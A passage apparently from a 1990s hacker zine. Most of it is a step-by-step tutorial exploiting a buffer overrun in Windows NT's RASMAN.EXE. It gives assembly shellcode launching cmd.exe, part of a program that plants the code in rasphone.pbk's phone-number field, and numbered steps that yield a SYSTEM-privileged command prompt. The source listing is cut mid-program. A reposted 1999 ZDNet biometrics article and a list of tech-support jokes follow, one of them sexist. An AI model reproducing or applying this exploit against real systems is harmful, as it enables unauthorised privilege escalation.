      The next thing to do is test this assembly to see if it works so we need to write a program that uses the __asm ( ) function. The __asm ( ) function takes Assembly
      language and incorporates it into a C program. As we are calling system ( ) which is exported by msvcrt.dll we'll need to load that- we use the LoadLibrary ( )
      function to do this - otherwise when run our code would fail: 
      
      #include <windows.h>
      #include <winbase.h>
      
      void main()
      {
      
                      LoadLibrary("msvcrt.dll");
      
      
                      __asm {
      
                              mov esp,ebp
                              push ebp
                              mov ebp,esp
                              xor edi,edi
                              push edi
                              sub esp,04h
                              mov byte ptr [ebp-08h],63h
                              mov byte ptr [ebp-07h],6Dh 
                              mov byte ptr [ebp-06h],64h 
                              mov byte ptr [ebp-05h],2Eh 
                              mov byte ptr [ebp-04h],65h 
                              mov byte ptr [ebp-03h],78h 
                              mov byte ptr [ebp-02h],65h
                              mov eax, 0x780208C3
                              push eax
                              lea eax,[ebp-08h]
                              push eax
                              call dword ptr [ebp-0ch]
      
                              
      
                                      
                      }
      }
      
      compile and link with kernel32.lib. When run this should start a new instance of the Command Interperter, cmd.exe. There will be an access violation however when
      you exit that instance in the program though - we've messed around with the stack and haven't clean up after ourselves. 
      
      That's it then - that's our arbritary code and all we need to do now is put this into the rasphone.pbk file as our telephone number. Before we can do that though, we
      need to get the op-codes for the above assembly. 
      
      This is relatively easy - just debug the program you've just compiled and get the opcodes from there. You should get "8B E5" for "mov esp,ebp" and "55" for "push
      ebp" etc etc. Once we have all the opcodes we need to put these in our "telephone number". But we can't type the opcodes very easily in Notepad. The easiest thing
      to do is write another program that creates a rasphone.pbk file with the telephone number loaded with our arbitary code. Below is an example of such a program
      with comments: 
      
      /* This program produces a rasphone.pbk file that will cause and exploit a buffer overrun in    */
      /* RASMAN.EXE - it will drop the user into a Command Prompt  started by the system.             */
      /* It operates by re-writing the EIP and pointing it back into our exploit string which calls   */

                              printf("Operation failed\n");

              else

                              fprintf(fd,"[Internet]\n");
                              fprintf(fd,"Phone Number=");
                              fprintf(fd,"%s",buffer);
                              fprintf(fd,"\n");

      return 0;
      }
      
      When compiled and run this program will create a rasphone.pbk file with one entry called Internet and a phone number loaded with our arbitary code. When
      RASMAN.EXE opens this file and it uses RasGetDialParams ( ) to get the relevant information and assigns it to a RAS_DIAL_PARAMS structure which contains
      the character arrays. As you'll have guessed we're overflowing the one that holds the telephone number. 
      
      Now to test it all.
      
      Quite often when trying to exploit buffer overruns you don't get it right the first time - usually due to an oversight or something. The code in this document has been
      tested on NT Server 4 with SP 3, NT Server 4 with SP 4 and NT Workstation SP 3 all running on a Pentium processor and it works - that's not to say that it will
      run on your machine though. There could be a number of reasons why it might not, but that is up to you to find out. So any way, let's test it: 
      
      To be able to get this to work take the following steps: 
      
      1) Make a backup copy of your real rasphone.pbk file and then delete the original. The NTFS permissions on this file by default give everybody the Change
      permission so there shouldn't be a problem with this. 
      
      2) Run rasphone (click on Start -> Run -> type rasphone -> OK). You should get a message saying that the phone book is empty and click OK to create a new
      one. 
      
      3) Click OK and make a new entry calling it "Internet". Put in the relevant information needed to be able to dial into your ISP. Once the entry is complete dial it. 
      
      4) Once connected open Outlook Express and download your e-mails. The reason for doing this is because this will create a Registry entry for your mail server's
      domain name and associate it as an autodialable address. If Outlook Express' connection is dial up change it to a LAN connection - this'll be under the mail
      account's properties. 
      
      5) Hangup and close Outlook Express. 
      
      6) Copy the delete the new rasphone.pbk and replace it with your one made from the above code. 
      
      7) Open Outlook Express. 
      
      Because your not connected to the Internet RASMAN should automatically dial for you, read in from the Registry the autodail information then open rasphone.pbk,
      fill its buffers and overflow. Within about eight seconds or so a Command Prompt window will open. This Command Prompt has SYSTEM privileges. 
      
      That's it - we've exploited a buffer overrun and executed our arbitary code.

 55.0 More on biometrics

      From HNS http://www.net-security.org/
      
      ZDNET ON BIOMETRICS
      by BHZ, Thursday 20th May 1999 on 10.15 pm CET
      Biometric security is well established now. Quick note: that this branch of computer
      security where you don't need passwords but you could be recognized by your
      thumb, eye or voice. ZdNet published an article about current biometric products ,
      prices and standards. Read the article below.

                WEDNESDAY, MAY 19, 1999
                The Biometrics
                Revolution
 
                Jesse Berst, Editorial Director
                ZDNet AnchorDesk
 
                Our ever-frugal Tech Director Jon DeKeles strolled into the office the other day and
      offered to buy everyone lunch. After I picked myself up off the floor, I demanded to see his ID. Some
      alien creature had obviously taken control of his body -- lab coat and all. 
 
      If AnchorDesk had the latest biometric technology, I wouldn't ask for ID. I'd have voice-authentication
      software to compare Jon's voice against an earlier voice-capture. Or I'd put him in front of a camera
      lens to scan his iris and match it against iris codes in the database. The rapidly evolving science of
      biometrics uses unique physical attributes -- voice, fingerprint, iris -- to identify users. Biometric
      security products exist now. But it will be another year at least before we start realizing their full
      potential. Here's a look at where the biometric roadmap will take us: 
 
      WHERE WE ARE
      Biometrics have been around for decades. The public sector -- particularly military and law
      enforcement -- were the early adopters. Today public agencies use biometrics for such things as
      preventing welfare fraud and determining eligibility for health care benefits. But usage outside of
      government remains spotty, particularly in the enterprise, for several reasons: 
 
      Steep prices. Costs range from less than $100 for a basic reading device to thousands for a fully
      integrated access system. But Gartner Group research director Jackie Fenn says costs are
      dropping dramatically. That will be key to widespread adoption. 
 
      Lack of standards. Integrating biometric systems with mainstream PC technology is a headache IT
      execs don't need. But there's movement toward standards among consortiums such as BioAPI.
      (See link below.) 
 
      Early failures. Vendors admit fingerprint sensor tools introduced last year weren't as robust as they
      needed to be -- a black mark on a fledgling industry.
 
      WHERE WE'RE GOING
      Government will continue to be a hot market for biometric security, but experts see huge potential in
      the financial community and the medical industry. The security issues that haunt corporate IT and
      ecommerce make them obvious markets for biometrics too. (For some fascinating biometric
      applications, see today's Special Report.) Here's how the Gartner Group predicts the biometric
      emergence will happen: 
 
         - 2000: Full-scale rollout of iris recognition for
           bank tellers and ATMs 
         - 2001: Fingerprint recognition becomes the
           remote access tool of choice for corporations
           that adopt biometrics 
         - 2002: Iris recognition gains lead over
           fingerprints for installations serving many
           users 
 
      What's your take on biometrics? Does the technology look like a long-term answer to our
      security woes? Use TalkBack to tell me what you think. Or jump to my Berst Alert forum and hash it
      out with other readers. 
 
      Too bad it's such a slow road to mainstream biometrics. Because some days I really do think
      AnchorDesk has been possessed. No sooner had Jon offered to buy everyone lunch, then our GenX
      associate editor Nicci Noteboom asked if I wanted her to stay late and help me with a project.

      Most infamous things people do on their computer
      http://www.vmnet.net/infamous.html
                                                                                                                      

      These are some of the better 'computer moments' we have found on the net. If you would like to add something just fill out the form below. 
  

      Our company used to sell time on our computers so very small companies that couldn't afford computers at the time could do their bookkeeping,
      etc. One day, a new woman came in. She fumbled about for about 10 minutes but I paid no attention to her. Finally she came out and grumbled
      something about how the computer wouldn't turn on. I grilled her with the usual obvious questions: Did you turn the switch on? Did you plug it in?
      Did you turn on the switch on the power strip? She was sure she had done everything right. I was sure she neglected to plug one of the power cords
      into the power strip. So, I went to investigate and she was *RIGHT*, she *HAD* plugged everything in to the power strip... including the power
      strip's own power cord - talk about a ground loop! 
      
      A woman called the shop where she had bought a PC and complained that it didn't work properly: Every time she switched it on the screen was
      filled with characters. Two technicians were sent out and were met by a woman with tits about twice the size of Dolly Parton's and glasses about
      two centimeters thick. They asked her to switch on the computer. This she did, and then leaned over the keyboard to read what was on the
      screen... The problem was quickly solved. 
      
      A tech support guy once told me that he got a call from someone saying that the computer screen just went black and the computer wouldn't
      respond at all. The tech guy (starting with the obvious) asked the guy if the computer was still plugged in that maybe his foot had knocked the plug
      out of the socket. The guy on the other end of the phone said to hold on that he would be back in a minute with a flashlight because the electricity
      had just gone out in his building and he couldn't see under the desk without the lights.... 
      
      I was trying to teach this sales person (for automated entrance system [they made gates]) how to enter his letters into Word Perfect. I told him to
      select Word Perfect from his menu and when he did it gave him the opening screen which said, "Press any key to continue..." He looked at the
      keyboard for awhile then asked me, "Where is the 'any' key?". 
      
      There is the classic one (which I hope is an urban myth) of the secretary working in an accounting firm who is told to make back up copies of the
      discs every night. Every night she carfully collected together all the discs and took them away to copy them. After six months the hard disc crashed
      but no-one was worried because they had backups, until the secretary brought in the huge pile of paper with a nice photocopied disc on each! 
      A user called the PC Support line of the university having trouble with her Mac. It was handed off to one of the Mac guys... "What seems to be the
      problem?" "It's not working." Eyes roll. "What's not working?" "My Mac." - Five minutes of drawing the problem out of the woman deleted - Okay,
      to access the files on the disk click the mouse on the picture of the disk." Pause. Nothing happened. I told you, I've already tried this." Support guy
      makes as if he is strangling the phone. "Okay, do it again. Is the mouse moving?" "Yep." "On the screen?" "Yep." "Now click twice on the picture of
      the disk." Pause and the consultant hears the two clicks again. "Nothing." "Maam, double-click once more for me." Clink-clink. "Maam, are you
      hitting the screen with your mouse.......?" 
      
      While I was working in a placement office at the University, we helped students write their resumes on the computer. A student came up to me and
      said he had problems reading the disk. I asked him to show it to me so I could see if I could recover the files, "Sure." he said, an took the disk (5
      1/4" floppy) out of his pocket and unfolded it. 
      
      Another time, while working at a computer store, somebody who bought his computer from us was having trouble with one of his disks. The man
      was living in another city, so I asked him to send me a copy of the disk, and I would take a look at it. A few days later, an envelope arrived for me,
      it contained a "photocopy" of the front and back side of the disk
